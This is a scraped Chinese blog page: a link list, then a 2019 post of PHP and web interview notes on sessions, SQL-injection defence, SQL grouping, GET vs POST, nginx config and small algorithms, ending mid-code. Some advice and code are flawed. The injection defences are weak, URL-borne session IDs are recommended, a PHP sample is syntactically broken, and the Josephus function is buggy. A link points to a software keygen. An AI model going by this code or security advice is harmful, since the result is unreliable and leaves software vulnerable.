<p><a href="https://github.com/shinima/battle-city" target="_blank" rel="noopener">GitHub 上开源的这个坦克大战小游戏https://battle-city.js.org/#/</a></p>
<p><a href="https://github.com/sherlonWang/logodiy" target="_blank" rel="noopener">在线 Logo 制作工具</a></p>
<p><a href="http://it2048.cn/" target="_blank" rel="noopener">导航网站</a></p>
<p><a href="https://michael728.github.io/2019/04/27/tools-ss-vps/" target="_blank" rel="noopener">shadowsocks+vps+mac翻墙Vultr</a></p>
<p><a href="https://www.biantube.com/watch?v=5IuJMGjMkKU&amp;from=timeline" target="_blank" rel="noopener">搜索YouTube视频</a></p>
<p><a href="https://github.com/521xueweihan/git-tips" target="_blank" rel="noopener">Git的奇技淫巧</a></p>
<p><a href="https://qishaoxuan.github.io/css_tricks/" target="_blank" rel="noopener">css奇技淫巧</a></p>
<p><a href="https://github.com/DoubleLabyrinth/Xmanager-keygen" target="_blank" rel="noopener">Xmanager Power Suit 安装</a></p>
<p>闲鱼搜索 <a href="https://s.2.taobao.com/list/list.htm?q=%E5%85%B3%E9%94%AE%E8%AF%8D&amp;search_type=item&amp;app=shopsearch" target="_blank" rel="noopener">https://s.2.taobao.com/list/list.htm?q=%E5%85%B3%E9%94%AE%E8%AF%8D&amp;search_type=item&amp;app=shopsearch</a></p>
<p>翻译工具 <a href="https://www.ltool.net/japanese-full-jenkaku-to-half-hankaku-converter-in-simplified-chinese.php" target="_blank" rel="noopener">https://www.ltool.net/japanese-full-jenkaku-to-half-hankaku-converter-in-simplified-chinese.php</a></p>
<p>幕布精选」投稿指南 <a href="https://mubu.com/doc/rBSPqyZmqp" target="_blank" rel="noopener">https://mubu.com/doc/rBSPqyZmqp</a></p>
<p><a href="https://learnku.com/articles/36220" target="_blank" rel="noopener">心智阅读系列：如何主动学习</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/28/面试资料收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/28/面试资料收集/" itemprop="url">面试资料收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-28T19:51:19+08:00">
                2019-02-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  22 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>###鉴别出那瓶水有毒<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">有<span class="number">1000</span>瓶水，其中有一瓶有毒，小白鼠只要尝一点带毒的水<span class="number">24</span>小时后就会死亡，至少要多少只小白鼠才能在<span class="number">24</span>小时时鉴别出那瓶水有毒</span><br><span class="line">链接：https:<span class="comment">//www.nowcoder.com/questionTerminal/84726a200b4a4a0d95b9565b4c6eb216</span></span><br><span class="line">来源：牛客网</span><br><span class="line"></span><br><span class="line">每个老鼠只有死或活<span class="number">2</span>种状态，因此每个老鼠可以看作一个bit，取<span class="number">0</span>或<span class="number">1</span></span><br><span class="line">N个老鼠可以看作N个bit，可以表达<span class="number">2</span>^N种状态（其中第i个状态代表第i个瓶子有毒）</span><br><span class="line">例如：当N＝<span class="number">2</span>时，可以表达<span class="number">4</span>种状态</span><br><span class="line"><span class="number">0</span>，<span class="number">0</span>（ 一号老鼠活，二号老鼠活）</span><br><span class="line"><span class="number">0</span>，<span class="number">1</span>（ 一号老鼠活，二号老鼠死）</span><br><span class="line"><span class="number">1</span>，<span class="number">0</span>（ 一号老鼠死，二号老鼠活）</span><br><span class="line"><span class="number">1</span>，<span class="number">1</span>（ 一号老鼠死，二号老鼠死）</span><br><span class="line">具体来说，有A、B、C、D这<span class="number">4</span>个瓶子，一号老鼠喝A和B， 二号老鼠喝B和C</span><br><span class="line">如果 <span class="number">0</span>，<span class="number">0</span> （ 一号老鼠活，二号老鼠活），说明是D有毒，第<span class="number">0</span>个状态代表第<span class="number">4</span>个瓶子有毒</span><br><span class="line">如果 <span class="number">0</span>，<span class="number">1</span> （ 一号老鼠活，二号老鼠死） ，说明是C有毒 ，第<span class="number">1</span>个状态代表第<span class="number">3</span>个瓶子有毒</span><br><span class="line">如果 <span class="number">1</span>，<span class="number">0</span> （ 一号老鼠死，二号老鼠活） ，说明是A有毒 ，第<span class="number">2</span>个状态代表第<span class="number">1</span>个瓶子有毒</span><br><span class="line">如果 <span class="number">1</span>，<span class="number">1</span> （ 一号老鼠死，二号老鼠死） ，说明是B有毒 ，第<span class="number">3</span>个状态代表第<span class="number">2</span>个瓶子有毒</span><br><span class="line">可以想象成用<span class="number">2</span>进制来表示<span class="number">1000</span>个数最少需要多少位</span><br></pre></td></tr></table></figure></p>
<h3 id="Cookie-禁用了，Session-还能用吗"><a href="#Cookie-禁用了，Session-还能用吗" class="headerlink" title="Cookie 禁用了，Session 还能用吗"></a>Cookie 禁用了，Session 还能用吗</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">你第一次访问网站时，</span><br><span class="line">https:<span class="comment">//learnku.com/articles/25858 </span></span><br><span class="line">服务端脚本中开启了Sessionsession_start();，</span><br><span class="line"></span><br><span class="line">服务器会生成一个不重复的 SESSIONID 的文件session_id();，比如在/<span class="keyword">var</span>/lib/php/session目录</span><br><span class="line"></span><br><span class="line">并将返回(Response)如下的HTTP头 <span class="built_in">Set</span>-Cookie:PHPSESSIONID=xxxxxxx</span><br><span class="line"></span><br><span class="line">客户端接收到<span class="built_in">Set</span>-Cookie的头，将PHPSESSIONID写入cookie</span><br><span class="line"></span><br><span class="line">当你第二次访问页面时，所有Cookie会附带的请求头(Request)发送给服务器端</span><br><span class="line"></span><br><span class="line">服务器识别PHPSESSIONID这个cookie，然后去session目录查找对应session文件，</span><br><span class="line"></span><br><span class="line">找到这个session文件后，检查是否过期，如果没有过期，去读取Session文件中的配置；如果已经过期，清空其中的配置</span><br><span class="line">如果一个Cookie都没接收到，基本上可以预判客户端禁用了Cookie，那将session_id附带在每个网址后面(包括POST)，</span><br><span class="line">比如：</span><br><span class="line"></span><br><span class="line">GET http:<span class="comment">//www.xx.com/index.php?session_id=xxxxx</span></span><br><span class="line">POST http:<span class="comment">//www.xx.com/post.php?session_id=xxxxx</span></span><br><span class="line">然后在每个页面的开头使用session_id($_GET[<span class="string">'session_id'</span>])，来强制指定当前session_id</span><br><span class="line">所以Laravel等框架中，内部实现了Session的所有逻辑，并将PHPSESSIONID设置为httponly并加密，这样，前端JS就无法读取和修改这些敏感信息，降低了被盗用的风险。</span><br></pre></td></tr></table></figure>
<h3 id="如何进行防-SQL-注入"><a href="#如何进行防-SQL-注入" class="headerlink" title="如何进行防 SQL 注入"></a>如何进行防 SQL 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 表单尽量用 post 提交,核心用户验证都走 post,避开 get容易暴露客户数据</span><br><span class="line"><span class="number">2</span> 使用HTTP_REFERER 检查源文件是否来自本系统</span><br><span class="line"><span class="number">3</span> 开启addslashes在特殊符号前加\</span><br><span class="line"><span class="number">4</span> 使用htmlspecialchars对字符串转实体</span><br><span class="line"><span class="number">5</span> 用户授权登录</span><br><span class="line"><span class="number">6</span> 使用PDO</span><br></pre></td></tr></table></figure>
<h3 id="大流量高并发量网站的解决方案"><a href="#大流量高并发量网站的解决方案" class="headerlink" title="大流量高并发量网站的解决方案"></a>大流量高并发量网站的解决方案</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">对比现实中饭店一下子同一个时间段来吃饭 比方中午https:<span class="comment">//learnku.com/articles/25886</span></span><br><span class="line"><span class="number">1</span> 把这个店面面积扩大点，增加同时吃饭人数</span><br><span class="line">   服务器优化：我们把apache服务器只支持（<span class="number">3000</span>并发）可以换成nginx服务器（<span class="number">3</span>w并发）</span><br><span class="line"><span class="number">2</span> 多找点服务员和厨师嘛  </span><br><span class="line">   服务器优化：修改apache，nginx的默认配置，把其中的并发数调到最高嘛</span><br><span class="line"><span class="number">3</span> 多开一些店 连锁店</span><br><span class="line">   服务器优化：多增加几台服务器同时对客户提供网络服务 lvs nginx 做负载均衡</span><br><span class="line"><span class="number">4</span> 限时客户在我们店吃饭的时间 不能让他们吃完还打牌把</span><br><span class="line">   服务器优化：减少客户在服务器上的连接断开时间 比方mysql 的连接断开时间 wait_timeout这个参数最多的连接时间 不能让客户恶意一直连着</span><br><span class="line"><span class="number">5</span> 给厨师培训 增加他的上菜时间</span><br><span class="line">   那就要给php代码做优化</span><br><span class="line"><span class="number">6</span> 让厨师叫手下把菜提前做好 放到冰箱里面</span><br><span class="line">   redis 缓存 文件缓存</span><br></pre></td></tr></table></figure>
<h3 id="sql分组"><a href="#sql分组" class="headerlink" title="sql分组"></a>sql分组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 算出每个班级中的学生，按照成绩降序排序;https:<span class="comment">//learnku.com/articles/25903#topnav</span></span><br><span class="line">select name,<span class="class"><span class="keyword">class</span>,<span class="title">score</span> <span class="title">from</span> <span class="title">student</span> <span class="title">order</span> <span class="title">by</span> <span class="title">class</span>,<span class="title">score</span> <span class="title">desc</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>) 查出每个班的及格人数和不及格人数，格式为:<span class="class"><span class="keyword">class</span>、及格人数、不及格人数</span>;</span><br><span class="line"></span><br><span class="line">SELECT <span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">SUM</span>(<span class="title">CASE</span> <span class="title">WHEN</span> <span class="title">score</span>&gt;</span>=<span class="number">60</span> THEN <span class="number">1</span> ELSE <span class="number">0</span> END),</span><br><span class="line">SUM(CASE WHEN score&lt;<span class="number">60</span> THEN <span class="number">1</span> ELSE <span class="number">0</span> END)</span><br><span class="line">FROM tb1 GROUP BY <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">这边主要先分组 在聚合在加入判断条件</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">3) 用 PHP 写入连接数据库("localhost","msuser","mspass")、执行以上 SQL、显示结果、 判断错误、关闭数据库的过程</span><br><span class="line">$conn=mysql_connect(‘localhost’,<span class="string">'msuser ’,’mspass′);//链接数据库</span></span><br><span class="line"><span class="string">Mysql_select_db(‘test’);</span></span><br><span class="line"><span class="string">$sql=" SELECT class,</span></span><br><span class="line"><span class="string">SUM(CASE WHEN score&gt;=60 THEN 1 ELSE 0 END), SUM(CASE WHEN score&lt;60 THEN 1 ELSE 0 END)</span></span><br><span class="line"><span class="string">FROM tb1 GROUP BY class";</span></span><br><span class="line"><span class="string">if($result=Mysql_query($sql))&#123;</span></span><br><span class="line"><span class="string">     while($row=mysql_fetch_assoc($result))&#123;</span></span><br><span class="line"><span class="string">     print_r($row);</span></span><br><span class="line"><span class="string">&#125; &#125;</span></span><br><span class="line"><span class="string">Mysql_close($conn);</span></span><br></pre></td></tr></table></figure>
<h3 id="GET-与-POST-的区别"><a href="#GET-与-POST-的区别" class="headerlink" title="GET 与 POST 的区别"></a>GET 与 POST 的区别</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">GET在浏览器回退时是无害的，而POST会再次提交请求。</span><br><span class="line">GET产生的URL地址可以被Bookmark，而POST不可以。</span><br><span class="line">GET请求会被浏览器主动cache，而POST不会，除非手动设置。</span><br><span class="line">GET请求只能进行url编码，而POST支持多种编码方式。</span><br><span class="line">GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</span><br><span class="line">GET请求在URL中传送的参数是有长度限制的，而POST么有。</span><br><span class="line">对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</span><br><span class="line">GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</span><br><span class="line">GET参数通过URL传递，POST放在Request body中</span><br><span class="line"></span><br><span class="line">GET产生一个TCP数据包；POST产生两个TCP数据包。https:<span class="comment">//learnku.com/articles/25881</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应<span class="number">200</span>（返回数据）；</span><br><span class="line"></span><br><span class="line">而对于POST，浏览器先发送header，服务器响应<span class="number">100</span> <span class="keyword">continue</span>，浏览器再发送data，服务器响应<span class="number">200</span> ok（返回数据）。</span><br><span class="line"></span><br><span class="line">也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。</span><br><span class="line"></span><br><span class="line">因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> GET与POST都有自己的语义，不能随便混用。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</span><br><span class="line"></span><br><span class="line">浏览器有没有默认发送 Expect:<span class="number">100</span>-<span class="keyword">continue</span> 的请求头就不清楚, 但是 curl 是默认会发送的. 具体的解释可以看鸟哥的博客: http:<span class="comment">//www.laruence.com/2011/01/20/1840.html</span></span><br><span class="line"></span><br><span class="line">摘抄一下重点:</span><br><span class="line"></span><br><span class="line">在使用curl做POST的时候, 当要POST的数据大于<span class="number">1024</span>字节的时候, curl并不会直接就发起POST请求, 而是会分为俩步,</span><br><span class="line"></span><br><span class="line"> <span class="number">1.</span> 发送一个请求, 包含一个Expect:<span class="number">100</span>-<span class="keyword">continue</span>, 询问Server使用愿意接受数据</span><br><span class="line"> <span class="number">2.</span> 接收到Server返回的<span class="number">100</span>-<span class="keyword">continue</span>应答以后, 才把数据POST给Server</span><br><span class="line"></span><br><span class="line">并不是所有的Server都会正确应答<span class="number">100</span>-<span class="keyword">continue</span>, 比如lighttpd, 就会返回<span class="number">417</span> “Expectation Failed”, 则会造成逻辑出错.</span><br><span class="line">因此, 在使用 curl 时可以考虑增加一步处理, 既在请求头中将 Expect 值置空. 鸟哥给出的 demo 是这样</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, array(<span class="string">'Expect:'</span>));</span><br><span class="line">guzzle 的做法是:</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the Expect header is not present, prevent curl from adding it</span></span><br><span class="line"><span class="keyword">if</span> (!$request-&gt;hasHeader(<span class="string">'Expect'</span>)) &#123;</span><br><span class="line">    $conf[CURLOPT_HTTPHEADER][] = <span class="string">'Expect:'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 监听 HTTP 协议默认的 [80] 端口。https://learnku.com/articles/25861</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    # 绑定主机名 [example.com]。</span><br><span class="line">    server_name example.com;</span><br><span class="line">    # 服务器站点根目录 [/example.com/public]。</span><br><span class="line">    root /example.com/public;</span><br><span class="line"></span><br><span class="line">    # 添加几条有关安全的响应头；与 Google+ 的配置类似，详情参见文末。</span><br><span class="line">    add_header X-Frame-Options <span class="string">"SAMEORIGIN"</span>;</span><br><span class="line">    add_header X-XSS-Protection <span class="string">"1; mode=block"</span>;</span><br><span class="line">    add_header X-Content-Type-Options <span class="string">"nosniff"</span>;</span><br><span class="line"></span><br><span class="line">    # 站点默认页面；可指定多个，将顺序查找。</span><br><span class="line">    # 例如，访问 http://example.com/ Nginx 将首先尝试「站点根目录/index.html」是否存在，不存在则继续尝试「站点根目录/index.htm」，以此类推...</span><br><span class="line">    index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">    # 指定字符集为 UTF-8</span><br><span class="line">    charset utf<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line">    # Laravel 默认重写规则；删除将导致 Laravel 路由失效且 Nginx 响应 404。</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    # 关闭 [/favicon.ico] 和 [/robots.txt] 的访问日志。</span></span><br><span class="line"><span class="regexp">    # 并且即使它们不存在，也不写入错误日志。</span></span><br><span class="line"><span class="regexp">    location = /</span>favicon.ico &#123; access_log off; log_not_found off; &#125;</span><br><span class="line">    location = <span class="regexp">/robots.txt  &#123; access_log off; log_not_found off; &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    # 将 [404] 错误交给 [/index.php] 处理，表示由 Laravel 渲染美观的错误页面。</span></span><br><span class="line"><span class="regexp">    error_page 404 /i</span>ndex.php;</span><br><span class="line"></span><br><span class="line">    # URI 符合正则表达式 [\.php$] 的请求将进入此段配置</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        # 配置 FastCGI 服务地址，可以为 IP:端口，也可以为 Unix socket。</span><br><span class="line">        fastcgi_pass unix:<span class="regexp">/var/</span>run/php/php7<span class="number">.2</span>-fpm.sock;</span><br><span class="line">        # 配置 FastCGI 的主页为 index.php。</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        # 配置 FastCGI 参数 SCRIPT_FILENAME 为 $realpath_root$fastcgi_script_name。</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;</span><br><span class="line">        # 引用更多默认的 FastCGI 参数。</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">    # 通俗地说，以上配置将所有 URI 以 .php 结尾的请求，全部交给 PHP-FPM 处理。</span><br><span class="line"></span><br><span class="line">    # 除符合正则表达式 [/\.(?!well-known).*] 之外的 URI，全部拒绝访问</span><br><span class="line">    # 也就是说，拒绝公开以 [.] 开头的目录，[.well-known] 除外</span><br><span class="line">    location ~ <span class="regexp">/\.(?!well-known).* &#123;</span></span><br><span class="line"><span class="regexp">        deny all;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>###判断两个有序数组是否有公共元素<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/chunlintang/interview/blob/master/src/algorithms/common.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">common</span>(<span class="params">$arr1, $arr2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$len1 = count($arr1);</span><br><span class="line">	$len2 = count($arr2);</span><br><span class="line">	$common = [];</span><br><span class="line">	$i = $j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ($i &lt; $len1 &amp;&amp; $j &lt; $len2) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($arr1[$i] &gt; $arr2[$j]) &#123;</span><br><span class="line">			$j++;</span><br><span class="line">		&#125; elseif ($arr1[$i] &lt; $arr2[$j]) &#123;</span><br><span class="line">			$i++;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			array_push($common, $arr1[$i]);</span><br><span class="line">			$i++;</span><br><span class="line">			$j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $common;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="猴子选大王，约瑟夫环"><a href="#猴子选大王，约瑟夫环" class="headerlink" title="猴子选大王，约瑟夫环"></a>猴子选大王，约瑟夫环</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">monkeyKing</span>(<span class="params">$n, $m</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$arr = [<span class="number">1</span>, $n];</span><br><span class="line">	$i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (count($arr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		$i++;</span><br><span class="line">		$survice = array_shift($arr);</span><br><span class="line">		<span class="keyword">if</span> ($i % $m != <span class="number">0</span>) &#123;</span><br><span class="line">			array_push($arr, $survice);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="质数"><a href="#质数" class="headerlink" title="质数"></a>质数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 质数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prime</span>(<span class="params">$n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$prime = [<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">for</span> ($i 